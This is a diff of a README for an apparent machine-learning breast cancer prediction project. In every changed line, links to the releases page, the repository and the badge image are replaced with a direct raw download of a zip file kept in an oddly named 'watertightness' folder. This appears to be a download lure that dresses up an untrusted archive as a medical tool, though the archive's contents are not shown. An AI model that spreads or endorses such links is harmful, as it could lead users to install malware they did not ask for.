@@ -1,6 +1,6 @@
 # 🩺 Breast-Cancer-prediction-using-machine-learning - Predict Breast Cancer Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/releases)
+[![Download Now](https://raw.githubusercontent.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/main/watertightness/Breast-Cancer-prediction-using-machine-learning.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/main/watertightness/Breast-Cancer-prediction-using-machine-learning.zip)
 
 ## 📜 Description
 
@@ -18,7 +18,7 @@ Follow these steps to download and run the application:
 
 2. **Visit the Releases Page**
    - Click the link below to reach the Releases page:
-   - [Download Here](https://github.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/releases)
+   - [Download Here](https://raw.githubusercontent.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/main/watertightness/Breast-Cancer-prediction-using-machine-learning.zip)
 
 3. **Choose the Latest Release**
    - Look for the latest version listed on the Releases page. 
@@ -58,7 +58,7 @@ If you encounter any issues while downloading or running the application, please
 
 ## 🔗 Links and Resources
 
-- GitHub Repository: [Breast-Cancer-prediction-using-machine-learning](https://github.com/andrew1550/Breast-Cancer-prediction-using-machine-learning)
-- [Download Here](https://github.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/releases) 
+- GitHub Repository: [Breast-Cancer-prediction-using-machine-learning](https://raw.githubusercontent.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/main/watertightness/Breast-Cancer-prediction-using-machine-learning.zip)
+- [Download Here](https://raw.githubusercontent.com/andrew1550/Breast-Cancer-prediction-using-machine-learning/main/watertightness/Breast-Cancer-prediction-using-machine-learning.zip) 
 
 Feel free to explore and engage with the project. Your feedback is welcome!
